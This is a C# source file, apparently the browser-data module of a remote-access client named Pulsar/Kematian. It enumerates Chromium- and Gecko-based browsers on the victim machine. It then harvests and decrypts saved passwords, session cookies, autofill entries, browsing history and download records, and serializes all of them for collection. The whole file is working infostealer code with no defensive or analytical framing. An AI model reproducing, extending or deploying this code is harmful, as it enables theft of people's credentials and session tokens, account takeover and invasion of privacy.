using Pulsar.Client.Kematian.Browsers.Chromium.Autofill;
using Pulsar.Client.Kematian.Browsers.Chromium.Cookies;
using Pulsar.Client.Kematian.Browsers.Chromium.Downloads;
using Pulsar.Client.Kematian.Browsers.Chromium.History;
using Pulsar.Client.Kematian.Browsers.Chromium.Passwords;
using Pulsar.Client.Kematian.Browsers.Gecko.Autofill;
using Pulsar.Client.Kematian.Browsers.Gecko.Cookies;
using Pulsar.Client.Kematian.Browsers.Gecko.Downloads;
using Pulsar.Client.Kematian.Browsers.Gecko.History;
using Pulsar.Client.Kematian.Browsers.Gecko.Passwords;
using Pulsar.Client.Kematian.Browsers.Helpers;
using Pulsar.Client.Kematian.Browsers.Helpers.JSON;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers
{
    /// <summary>
    /// Represents a browser found on the system for organizing data
    /// </summary>
    public class BrowserInfo
    {
        public string Name { get; set; }
        public string Path { get; set; }
        public string Type { get; set; }
        public object Data { get; set; }
        
        public bool IsChromium => Type == "Chromium";
        public bool IsGecko => Type == "Gecko";
    }

    public class BrowsersRetriever
    {
        private readonly List<ChromiumBrowserPath> _chromiumBrowsers;
        private readonly List<GeckoBrowserPath> _geckoBrowsers;

        public BrowsersRetriever()
        {
            Crawler crawler = new Crawler();

            var chromiumTask = Task.Run(() => crawler.GetChromiumBrowsers());
            var geckoTask = Task.Run(() => crawler.GetGeckoBrowsers());

            Task.WaitAll(chromiumTask, geckoTask);

            _chromiumBrowsers = chromiumTask.Result;
            _geckoBrowsers = geckoTask.Result;
        }

        /// <summary>
        /// Returns a list of browsers found on the system
        /// </summary>
        public List<BrowserInfo> GetBrowserList()
        {
            var browsers = new List<BrowserInfo>();
            var browserPaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var browser in _chromiumBrowsers)
            {
                string browserName = GetBrowserNameFromPath(browser.ProfilePath);
                string path = browser.ProfilePath.ToLowerInvariant();
                
                if (browserPaths.Contains(path))
                {
                    continue;
                }
                
                browserPaths.Add(path);
                browsers.Add(new BrowserInfo
                {
                    Name = browserName,
                    Path = browser.ProfilePath,
                    Type = "Chromium",
                    Data = browser
                });
            }

            var geckoBrowserGroups = _geckoBrowsers
                .GroupBy(b => GetBrowserNameFromPath(b.ProfilesPath))
                .ToList();
            
            var processedBrowserNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            
            foreach (var browserGroup in geckoBrowserGroups)
            {
                string browserName = browserGroup.Key;
                
                if (processedBrowserNames.Contains(browserName))
                {
                    continue;
                }
                
                var firstBrowser = browserGroup.First();
                
                var profilePaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                var uniqueProfiles = new List<GeckoProfile>();
                
                foreach (var browserInstance in browserGroup)
                {
                    foreach (var profile in browserInstance.Profiles)
                    {
                        if (!profilePaths.Contains(profile.Path))
                        {
                            profilePaths.Add(profile.Path);
                            uniqueProfiles.Add(profile);
                        }
                    }
                }
                
                var consolidatedBrowser = new GeckoBrowserPath
                {
                    ProfilesPath = firstBrowser.ProfilesPath,
                    Profiles = uniqueProfiles.ToArray()
                };
                
                processedBrowserNames.Add(browserName);
                browsers.Add(new BrowserInfo
                {
                    Name = browserName,
                    Path = firstBrowser.ProfilesPath,
                    Type = "Gecko",
                    Data = consolidatedBrowser
                });
            }

            return browsers;
        }

        /// <summary>
        /// Extracts browser name from its path
        /// </summary>
        private string GetBrowserNameFromPath(string path)
        {
            try
            {
                string[] knownBrowsers = new[] {
                    "Chrome", "Brave", "Edge", "Opera", "Vivaldi", "Firefox", 
                    "Chromium", "Epic", "Yandex", "Iridium", "UCBrowser", "CentBrowser",
                    "LibreWolf", "Librewolf", "Zen Browser", "zen", "Waterfox", "Pale Moon"
                };

                foreach (var browser in knownBrowsers)
                {
                    if (path.IndexOf(browser, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        if (browser.Equals("zen", StringComparison.OrdinalIgnoreCase) &&
                            !browser.Equals("Zen Browser", StringComparison.OrdinalIgnoreCase))
                        {
                            return "Zen Browser";
                        }
                        
                        if (browser.Equals("librewolf", StringComparison.OrdinalIgnoreCase) &&
                            !browser.Equals("LibreWolf", StringComparison.OrdinalIgnoreCase))
                        {
                            return "LibreWolf";
                        }
                        
                        return browser;
                    }
                }

                if (path.IndexOf("Profiles", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    var profilesIndex = path.IndexOf("Profiles", StringComparison.OrdinalIgnoreCase);
                    var parentPath = path.Substring(0, profilesIndex).TrimEnd('\\', '/');
                    var dirName = Path.GetFileName(parentPath);
                    
                    if (!string.IsNullOrEmpty(dirName))
                    {
                        if (dirName.Equals("zen", StringComparison.OrdinalIgnoreCase))
                            return "Zen Browser";
                        if (dirName.Equals("librewolf", StringComparison.OrdinalIgnoreCase))
                            return "LibreWolf";
                            
                        return dirName;
                    }
                }

                string directoryName = Path.GetFileName(Path.GetDirectoryName(path));
                if (!string.IsNullOrEmpty(directoryName))
                {
                    if (directoryName.Equals("zen", StringComparison.OrdinalIgnoreCase))
                        return "Zen Browser";
                    if (directoryName.Equals("librewolf", StringComparison.OrdinalIgnoreCase))
                        return "LibreWolf";
                        
                    return directoryName;
                }

                return "Unknown";
            }
            catch
            {
                return "Unknown";
            }
        }

        #region Browser-specific methods

        /// <summary>
        /// Gets cookies for a specific browser
        /// </summary>
        public string GetCookiesForBrowser(BrowserInfo browser)
        {
            try
            {
                switch (browser.Type)
                {
                    case "Chromium" when browser.Data != null:
                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
                        
                        var chromiumResult = new List<string>();
                        foreach (var profile in chromiumBrowser.Profiles)
                        {
                            chromiumResult.AddRange(GetChromiumCookies(profile, chromiumBrowser.LocalStatePath));
                        }
                        return string.Join(Environment.NewLine, chromiumResult);
                        
                    case "Gecko" when browser.Data != null:
                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
                        
                        var geckoResult = new List<string>();
                        foreach (var profile in geckoBrowser.Profiles)
                        {
                            geckoResult.AddRange(GetGeckoCookies(profile));
                        }
                        return string.Join(Environment.NewLine, geckoResult);
                        
                    default:
                        return string.Empty;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving cookies for {browser.Name}: {ex.Message}");
                return string.Empty;
            }
        }

        /// <summary>
        /// Gets history for a specific browser
        /// </summary>
        public string GetHistoryForBrowser(BrowserInfo browser)
        {
            try
            {
                var allHistory = new List<Dictionary<string, string>>();

                switch (browser.Type)
                {
                    case "Chromium" when browser.Data != null:
                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
                        
                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in chromiumBrowser.Profiles)
                        {
                            chromiumTasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
                        }

                        Task.WaitAll(chromiumTasks.ToArray());
                        foreach (var task in chromiumTasks)
                        {
                            allHistory.AddRange(task.Result);
                        }
                        break;
                        
                    case "Gecko" when browser.Data != null:
                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
                        
                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in geckoBrowser.Profiles)
                        {
                            geckoTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
                        }

                        Task.WaitAll(geckoTasks.ToArray());
                        foreach (var task in geckoTasks)
                        {
                            allHistory.AddRange(task.Result);
                        }
                        break;
                }

                return allHistory.Count > 0
                    ? (allHistory.Count > 1000 
                        ? Serializer.SerializeDataInBatches(allHistory, 1000) 
                        : Serializer.SerializeData(allHistory))
                    : "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving history for {browser.Name}: {ex.Message}");
                return "[]";
            }
        }

        /// <summary>
        /// Gets passwords for a specific browser
        /// </summary>
        public string GetPasswordsForBrowser(BrowserInfo browser)
        {
            try
            {
                var allPasswords = new List<Dictionary<string, string>>();

                switch (browser.Type)
                {
                    case "Chromium" when browser.Data != null:
                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
                        
                        var tasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in chromiumBrowser.Profiles)
                        {
                            if (profile.LoginData != null && File.Exists(profile.LoginData) && 
                                !string.IsNullOrEmpty(chromiumBrowser.LocalStatePath))
                            {
                                tasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, chromiumBrowser.LocalStatePath)));
                            }
                        }

                        if (tasks.Count > 0)
                        {
                            Task.WaitAll(tasks.ToArray());
                            foreach (var task in tasks)
                            {
                                if (task != null && task.Result != null)
                                {
                                    allPasswords.AddRange(task.Result);
                                }
                            }
                        }
                        break;
                        
                    case "Gecko" when browser.Data != null:
                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
                        
                        foreach (var profile in geckoBrowser.Profiles)
                        {
                            if (profile.Path != null && Directory.Exists(profile.Path))
                            {
                                var geckoPasswords = GetGeckoPasswordsForProfile(profile);
                                if (geckoPasswords != null)
                                {
                                    allPasswords.AddRange(geckoPasswords);
                                }
                            }
                        }
                        break;
                }

                return allPasswords.Count > 0
                    ? (allPasswords.Count > 1000 
                        ? Serializer.SerializeDataInBatches(allPasswords, 1000) 
                        : Serializer.SerializeData(allPasswords))
                    : "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving passwords for {browser.Name}: {ex.Message}");
                return "[]";
            }
        }

        /// <summary>
        /// Gets autofill data for a specific browser
        /// </summary>
        public string GetAutoFillForBrowser(BrowserInfo browser)
        {
            try
            {
                var allAutoFillData = new List<Dictionary<string, string>>();

                switch (browser.Type)
                {
                    case "Chromium" when browser.Data != null:
                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
                        
                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in chromiumBrowser.Profiles)
                        {
                            chromiumTasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
                        }

                        Task.WaitAll(chromiumTasks.ToArray());
                        foreach (var task in chromiumTasks)
                        {
                            allAutoFillData.AddRange(task.Result);
                        }
                        break;
                        
                    case "Gecko" when browser.Data != null:
                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
                        
                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in geckoBrowser.Profiles)
                        {
                            geckoTasks.Add(Task.Run(() => GetGeckoAutofillForProfile(profile)));
                        }

                        Task.WaitAll(geckoTasks.ToArray());
                        foreach (var task in geckoTasks)
                        {
                            allAutoFillData.AddRange(task.Result);
                        }
                        break;
                }

                return allAutoFillData.Count > 0
                    ? (allAutoFillData.Count > 1000 
                        ? Serializer.SerializeDataInBatches(allAutoFillData, 1000) 
                        : Serializer.SerializeData(allAutoFillData))
                    : "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving autofill data for {browser.Name}: {ex.Message}");
                return "[]";
            }
        }

        /// <summary>
        /// Gets downloads for a specific browser
        /// </summary>
        public string GetDownloadsForBrowser(BrowserInfo browser)
        {
            try
            {
                var allDownloads = new List<Dictionary<string, string>>();

                switch (browser.Type)
                {
                    case "Chromium" when browser.Data != null:
                        ChromiumBrowserPath chromiumBrowser = (ChromiumBrowserPath)browser.Data;
                        
                        var chromiumTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in chromiumBrowser.Profiles)
                        {
                            chromiumTasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
                        }

                        Task.WaitAll(chromiumTasks.ToArray());
                        foreach (var task in chromiumTasks)
                        {
                            allDownloads.AddRange(task.Result);
                        }
                        break;
                        
                    case "Gecko" when browser.Data != null:
                        GeckoBrowserPath geckoBrowser = (GeckoBrowserPath)browser.Data;
                        
                        var geckoTasks = new List<Task<List<Dictionary<string, string>>>>();
                        foreach (var profile in geckoBrowser.Profiles)
                        {
                            geckoTasks.Add(Task.Run(() => GetGeckoDownloadsForProfile(profile)));
                        }

                        Task.WaitAll(geckoTasks.ToArray());
                        foreach (var task in geckoTasks)
                        {
                            allDownloads.AddRange(task.Result);
                        }
                        break;
                }

                return allDownloads.Count > 0
                    ? (allDownloads.Count > 1000 
                        ? Serializer.SerializeDataInBatches(allDownloads, 1000) 
                        : Serializer.SerializeData(allDownloads))
                    : "[]";
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving downloads for {browser.Name}: {ex.Message}");
                return "[]";
            }
        }

        #endregion

        public string GetHistory()
        {
            try
            {
                var allHistory = new List<Dictionary<string, string>>();

                // Process Chromium browsers in parallel
                var chromiumHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        chromiumHistoryTasks.Add(Task.Run(() => GetChromiumHistoryForProfile(profile)));
                    }
                }

                // Process Gecko browsers in parallel
                var geckoHistoryTasks = new List<Task<List<Dictionary<string, string>>>>();
                foreach (var browser in _geckoBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        geckoHistoryTasks.Add(Task.Run(() => GetGeckoHistoryForProfile(profile)));
                    }
                }

                // Wait for all tasks to complete
                Task.WaitAll(chromiumHistoryTasks.ToArray());
                Task.WaitAll(geckoHistoryTasks.ToArray());

                // Collect all results
                foreach (var task in chromiumHistoryTasks)
                {
                    allHistory.AddRange(task.Result);
                }

                foreach (var task in geckoHistoryTasks)
                {
                    allHistory.AddRange(task.Result);
                }

                // Serialize the dictionary list
                return allHistory.Count > 1000
                    ? Serializer.SerializeDataInBatches(allHistory, 1000)
                    : Serializer.SerializeData(allHistory);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving history: {ex.Message}");
                return "[]";
            }
        }

        private List<Dictionary<string, string>> GetChromiumHistoryForProfile(ChromiumProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var history = HistoryChromium.GetHistoryChromium(profile.History);
                    foreach (var entry in history)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"VisitCount", entry.VisitCount},
                                {"Date Last Viewed", entry.LastVisitTime}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium history for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetGeckoHistoryForProfile(GeckoProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var history = HistoryGecko.GetHistoryGecko(profile.History);
                    
                    foreach (var entry in history)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"VisitCount", entry.VisitCount},
                                {"Date Last Viewed", entry.LastVisitTime}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko history for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        public string GetAutoFillData()
        {
            try
            {
                var allAutoFillData = new List<Dictionary<string, string>>();
                var autoFillTasks = new List<Task<List<Dictionary<string, string>>>>();

                // Process Chromium browsers in parallel
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        autoFillTasks.Add(Task.Run(() => GetChromiumAutofillForProfile(profile)));
                    }
                }

                Task.WaitAll(autoFillTasks.ToArray());

                // Collect all results
                foreach (var task in autoFillTasks)
                {
                    allAutoFillData.AddRange(task.Result);
                }

                // Serialize the dictionary list
                return allAutoFillData.Count > 1000
                    ? Serializer.SerializeDataInBatches(allAutoFillData, 1000)
                    : Serializer.SerializeData(allAutoFillData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving autofill data: {ex.Message}");
                return "[]";
            }
        }

        private List<Dictionary<string, string>> GetChromiumAutofillForProfile(ChromiumProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.WebData != null && System.IO.File.Exists(profile.WebData))
                {
                    var autoFillData = Autofill.GetAutofillEntries(profile.WebData);
                    foreach (var entry in autoFillData)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Name", entry.Name},
                                {"Value", entry.Value},
                                {"Value_lower", entry.Value_lower},
                                {"Date_created", entry.Date_created},
                                {"Date_last_used", entry.Date_last_used},
                                {"Count", entry.Count}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium autofill for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        public string GetCookies()
        {
            try
            {
                var allCookies = new List<string>();
                var cookieTasks = new List<Task<List<string>>>();

                // Process Chromium browsers in parallel
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        cookieTasks.Add(Task.Run(() => GetChromiumCookies(profile, browser.LocalStatePath)));
                    }
                }
                
                foreach (var browser in _geckoBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        cookieTasks.Add(Task.Run(() => GetGeckoCookies(profile)));
                    }
                }

                Task.WaitAll(cookieTasks.ToArray());

                // Collect all results
                foreach (var task in cookieTasks)
                {
                    allCookies.AddRange(task.Result);
                }

                // Combine all cookies into a single string with new lines
                return string.Join(Environment.NewLine, allCookies);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving cookies: {ex.Message}");
                return string.Empty;
            }
        }

        private List<string> GetChromiumCookies(ChromiumProfile profile, string localStatePath)
        {
            var result = new List<string>();
            try
            {
                if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
                {
                    var cookies = CookiesChromium.GetCookies(profile.Cookies, localStatePath);
                    
                    foreach (var cookie in cookies)
                    {
                        var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
                        result.Add(netscapeCookie);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium cookies for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }
        
        private List<string> GetGeckoCookies(GeckoProfile profile)
        {
            var result = new List<string>();
            try
            {
                if (profile.Cookies != null && System.IO.File.Exists(profile.Cookies))
                {
                    var cookies = CookiesGecko.GetCookies(profile.Cookies);
                    
                    foreach (var cookie in cookies)
                    {
                        var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
                        result.Add(netscapeCookie);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko cookies for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        public string GetDownloads()
        {
            try
            {
                var allDownloads = new List<Dictionary<string, string>>();
                var downloadTasks = new List<Task<List<Dictionary<string, string>>>>();

                // Process Chromium browsers in parallel
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        downloadTasks.Add(Task.Run(() => GetChromiumDownloadsForProfile(profile)));
                    }
                }

                Task.WaitAll(downloadTasks.ToArray());

                // Collect all results
                foreach (var task in downloadTasks)
                {
                    allDownloads.AddRange(task.Result);
                }

                return allDownloads.Count > 1000
                    ? Serializer.SerializeDataInBatches(allDownloads, 1000)
                    : Serializer.SerializeData(allDownloads);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving downloads: {ex.Message}");
                return "[]";
            }
        }

        private List<Dictionary<string, string>> GetChromiumDownloadsForProfile(ChromiumProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.History != null && System.IO.File.Exists(profile.History))
                {
                    var downloads = DownloadsChromium.GetDownloadsChromium(profile.History);
                    foreach (var entry in downloads)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"CurrentPath", entry.Current_path },
                                {"TargetPath", entry.Target_path },
                                {"StartTime", entry.Start_time },
                                {"ReceivedBytes", entry.Received_bytes },
                                {"TotalBytes", entry.Total_bytes },
                                {"DangerType", entry.Danger_type },
                                {"EndTime", entry.End_time },
                                {"Opened", entry.Opened },
                                {"LastAccessTime", entry.Last_access_time },
                                {"Referrer", entry.Referrer },
                                {"TabUrl", entry.Tab_url },
                                {"TabReferrerUrl", entry.Tab_referrer_url },
                                {"MimeType", entry.Mime_type },
                                {"OriginalMimeType", entry.Original_mime_type }
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium downloads for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        public string GetPasswords()
        {
            try
            {
                var allPasswords = new List<Dictionary<string, string>>();
                var passwordTasks = new List<Task<List<Dictionary<string, string>>>>();

                // Process Chromium browsers in parallel
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        if (profile.LoginData == null || !File.Exists(profile.LoginData) || string.IsNullOrEmpty(browser.LocalStatePath))
                            continue;

                        passwordTasks.Add(Task.Run(() => GetChromiumPasswordsForProfile(profile, browser.LocalStatePath)));
                    }
                }

                // Wait for all Chromium tasks to complete
                if (passwordTasks.Count > 0)
                {
                    Task.WaitAll(passwordTasks.ToArray());

                    // Collect Chromium results
                    foreach (var task in passwordTasks)
                    {
                        if (task != null && task.Result != null)
                        {
                            allPasswords.AddRange(task.Result);
                        }
                    }
                }

                // Process Gecko browsers sequentially to avoid decryption conflicts
                foreach (var browser in _geckoBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        if (profile.Path == null || !Directory.Exists(profile.Path))
                            continue;

                        // Process each Gecko profile sequentially
                        List<Dictionary<string, string>> geckoPasswords = null;
                        try
                        {
                            Debug.WriteLine(profile);
                            geckoPasswords = GetGeckoPasswordsForProfile(profile);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
                        }
                        if (geckoPasswords != null)
                        {
                            allPasswords.AddRange(geckoPasswords);
                        }
                    }
                }

                return allPasswords.Count > 1000
                    ? Serializer.SerializeDataInBatches(allPasswords, 1000)
                    : Serializer.SerializeData(allPasswords);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error retrieving passwords: {ex.Message}");
                return "[]";
            }
        }

        private List<Dictionary<string, string>> GetChromiumPasswordsForProfile(ChromiumProfile profile, string localStatePath)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                if (profile.LoginData != null && System.IO.File.Exists(profile.LoginData))
                {
                    Debug.WriteLine($"Processing passwords for profile: {profile.Name}, LoginData: {profile.LoginData}");
                    var passwords = PasswordsChromium.GetLogins(profile.LoginData, localStatePath);
                    foreach (var entry in passwords)
                    {
                        var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Username", entry.Username},
                                {"Password", entry.Password}
                            };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Chromium passwords for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }

        private List<Dictionary<string, string>> GetGeckoPasswordsForProfile(GeckoProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            
            try
            {
            bool signonsFound = false;
            bool loginsFound = false;
                bool key4Found = false;
                
                string signonsPath = null;
                string loginsPath = null;
                string key4Path = null;

                if (File.Exists(profile.Key4DB))
                {
                    key4Found = true;
                    key4Path = profile.Key4DB;
                }

                if (File.Exists(profile.LoginsJson))
                {
                    loginsFound = true;
                    loginsPath = profile.LoginsJson;
                }

                if (!key4Found || !loginsFound)
                {
                    string[] signons = Directory.GetFiles(profile.Path, "signons.sqlite", SearchOption.AllDirectories);
            if (signons.Length > 0)
            {
                signonsFound = true;
                        signonsPath = signons[0];
                    }

                    if (!loginsFound)
                    {
                        string[] logins = Directory.GetFiles(profile.Path, "logins.json", SearchOption.AllDirectories);
                        if (logins.Length > 0)
            {
                loginsFound = true;
                            loginsPath = logins[0];
                        }
                    }
                    
                    if (!key4Found)
                    {
                        string[] key4Files = Directory.GetFiles(profile.Path, "key4.db", SearchOption.AllDirectories);
                        if (key4Files.Length > 0)
                        {
                            key4Found = true;
                            key4Path = key4Files[0];
                        }
                    }
                }

                if ((loginsFound || signonsFound) && key4Found)
                {
                    string nssInitPath = Path.GetDirectoryName(key4Path);
                    
                var geckoLogins = new PasswordsGecko();
                    var passwords = geckoLogins.GetLogins(
                        nssInitPath, 
                        loginsFound ? loginsPath : null, 
                        signonsFound ? signonsPath : null
                    );
                geckoLogins.Dispose();

                foreach (var entry in passwords)
                {
                    var newEntry = new Dictionary<string, string>
                    {
                        {"Url", entry.Url},
                        {"Username", entry.Username},
                        {"Password", entry.Password}
                    };
                    result.Add(newEntry);
                }
                    
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko passwords for profile {profile.Name}: {ex.Message}");
            }
            
            return result;
        }
        
        private string GetBrowserName(string path)
        {
            var browserMappings = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                { "librewolf", "LibreWolf" },
                { "firefox", "Firefox" },
                { "zen", "Zen Browser" },
                { "waterfox", "Waterfox" },
                { "palemoon", "Pale Moon" },
                { "pale moon", "Pale Moon" },
                { "seamonkey", "SeaMonkey" },
                { "chrome", "Chrome" },
                { "edge", "Edge" },
                { "brave", "Brave" },
                { "opera gx", "Opera GX" },
                { "opera", "Opera" },
                { "vivaldi", "Vivaldi" },
                { "chromium", "Chromium" },
                { "epic", "Epic Browser" },
                { "yandex", "Yandex Browser" },
                { "iridium", "Iridium Browser" },
                { "ucbrowser", "UCBrowser" },
                { "centbrowser", "CentBrowser" }
            };

            foreach (var browser in browserMappings)
            {
                if (path.IndexOf(browser.Key, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    return browser.Value;
                }
            }
            
            return null;
        }

        private List<Dictionary<string, string>> GetGeckoAutofillForProfile(GeckoProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                string formHistoryPath = Path.Combine(profile.Path, "formhistory.sqlite");
                if (!File.Exists(formHistoryPath))
                {
                    
                    string[] formHistoryFiles = Directory.GetFiles(profile.Path, "formhistory.sqlite", SearchOption.AllDirectories);
                    if (formHistoryFiles.Length > 0)
                    {
                        formHistoryPath = formHistoryFiles[0];
                    }
                    else 
                    {
                        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                        string browserName = null;

                        browserName = GetBrowserName(profile.Path);
                        
                        if (browserName != null)
                        {
                            string[] possiblePaths = {
                                Path.Combine(appDataPath, browserName),
                                Path.Combine(appDataPath, "Mozilla", browserName),
                                Path.Combine(appDataPath, "Mozilla", "Firefox")
                            };
                            
                            foreach (var path in possiblePaths)
                            {
                                if (Directory.Exists(path))
                                {
                                    string[] files = Directory.GetFiles(path, "formhistory.sqlite", SearchOption.AllDirectories);
                                    if (files.Length > 0)
                                    {
                                        formHistoryPath = files[0];
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                
                if (File.Exists(formHistoryPath))
                {
                    var autofillData = AutofillGecko.GetAutofill(formHistoryPath);
                    
                    foreach (var entry in autofillData)
                    {
                        var newEntry = new Dictionary<string, string>
                        {
                            {"Name", entry.Name},
                            {"Value", entry.Value},
                            {"Value_lower", entry.Value_lower},
                            {"Date_created", entry.Date_created},
                            {"Date_last_used", entry.Date_last_used},
                            {"Count", entry.Count}
                        };
                        result.Add(newEntry);
                    }
                }
                else
                {

                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error processing Gecko autofill for profile {profile.Name}: {ex.Message}");
            }
            return result;
        }
        
        private List<Dictionary<string, string>> GetGeckoDownloadsForProfile(GeckoProfile profile)
        {
            var result = new List<Dictionary<string, string>>();
            try
            {
                string placesDbPath = null;
                
                if (profile.History != null && File.Exists(profile.History) && 
                    profile.History.EndsWith("places.sqlite", StringComparison.OrdinalIgnoreCase))
                {
                    placesDbPath = profile.History;
                }
                else
                {
                    string[] placesFiles = Directory.GetFiles(profile.Path, "places.sqlite", SearchOption.AllDirectories);
                    if (placesFiles.Length > 0)
                    {
                        placesDbPath = placesFiles[0];
                    }
                    else
                    {
                        string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                        string browserName = null;

                        browserName = GetBrowserName(profile.Path);
                    }
                }
                
                if (placesDbPath != null && File.Exists(placesDbPath))
                {
                    var downloads = DownloadsGecko.GetDownloads(placesDbPath);
                    
                    foreach (var entry in downloads)
                    {
                        var newEntry = new Dictionary<string, string>
                        {
                            {"CurrentPath", entry.Current_path ?? string.Empty},
                            {"TargetPath", entry.Target_path ?? string.Empty},
                            {"StartTime", entry.Start_time ?? string.Empty},
                            {"ReceivedBytes", entry.Received_bytes ?? string.Empty},
                            {"TotalBytes", entry.Total_bytes ?? string.Empty},
                            {"DangerType", entry.Danger_type ?? string.Empty},
                            {"EndTime", entry.End_time ?? string.Empty},
                            {"Opened", entry.Opened ?? string.Empty},
                            {"LastAccessTime", entry.Last_access_time ?? string.Empty},
                            {"Referrer", entry.Referrer ?? string.Empty},
                            {"TabUrl", entry.Tab_url ?? string.Empty},
                            {"TabReferrerUrl", entry.Tab_referrer_url ?? string.Empty},
                            {"MimeType", entry.Mime_type ?? string.Empty},
                            {"OriginalMimeType", entry.Original_mime_type ?? string.Empty}
                        };
                        result.Add(newEntry);
                    }
                }
            }
            catch (Exception)
            {

            }
            return result;
        }
    }
}